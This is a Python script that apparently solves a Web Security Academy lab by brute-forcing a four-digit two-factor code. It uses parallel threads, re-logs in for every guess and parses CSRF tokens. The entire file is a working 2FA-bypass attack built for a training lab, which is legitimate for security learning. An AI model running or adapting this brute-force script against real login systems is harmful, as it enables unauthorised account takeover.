import requests
import sys
import urllib3
from itertools import product
from time import time
import threading
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Authentication username and password
# Lab Title: 2FA bypass using a brute-force attack
# Error can be check in function returns

# Burp suite proxy
proxy_urls = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',
}

thread_list = []
solved_flag = False # flag to check code found, and no further request send

# Extract csrf
def get_csrf(res):    
    bSoup = BeautifulSoup(res, 'html.parser')
    csrf = bSoup.find('input', {'name': 'csrf'})['value']
    return csrf

    
# Send login request
def send_login_req(sn):
    res = sn.get(k_url + '/login', proxies=proxy_urls, verify=False).text
    csrf = get_csrf(res)

    res = sn.post(k_url + '/login', {'csrf': csrf, 'username': username, 'password': password}, proxies=proxy_urls, verify=False).text
    csrf = get_csrf(res)

    return csrf


# Function get 4-digit code and then send requests and check responses
def brute_force_code(i, j):
    global solved_flag    
    sn = requests.Session()
        
    for code in product('0123456789', repeat=2):
        if solved_flag:
            break
        c = str(i) + str(j) + code[0] + code[1]
        csrf = send_login_req(sn)

        res = sn.post(k_url + '/login2', {'csrf': csrf, 'mfa-code': c}, proxies=proxy_urls, verify=False)

        if "account-content" in res.text:
            print("[-] Solved! verification Code: ", c)
            solved_flag = True
            break


# Function starts 1 range at a time and check the solved_flag
def main():
    global solved_flag
    
    print()
    print("[*] Processing...")

    start_t = time()

    # initial request
    sn_init = requests.Session()
    csrf = send_login_req(sn_init)

    # start 1 range at a time, and check the solved flag
    for i in range(10):
        for j in range(10):
            t = threading.Thread(target=brute_force_code, name="p-%d-%d" %(i,j), args=(i, j))
            t.start()
            thread_list.append(t)
            
        for tj in thread_list:
            tj.join()       

        # break the loop no need to start next threads
        if solved_flag:
            break

        thread_list.clear()         

    end_t = time()
    print("[-] Execution Time: %.5f seconds" % (end_t - start_t))


if __name__ == "__main__":
    # User input: Lab URL, username, and password
    k_url = input("Enter Lab URL: ").strip().rstrip("/")
    username = input("Enter Account Username: ").strip()
    password = input("Enter Account Password: ").strip()
    
    if (not (k_url and username and password)):
        print()
        print("[-] Error! Input variable(s) missing.")
        print("[-] Lab URL: https://a...........c2.web-security-academy.net")
        print("[-] Username")
        print("[-] Password")
        sys.exit()
    else:
        main()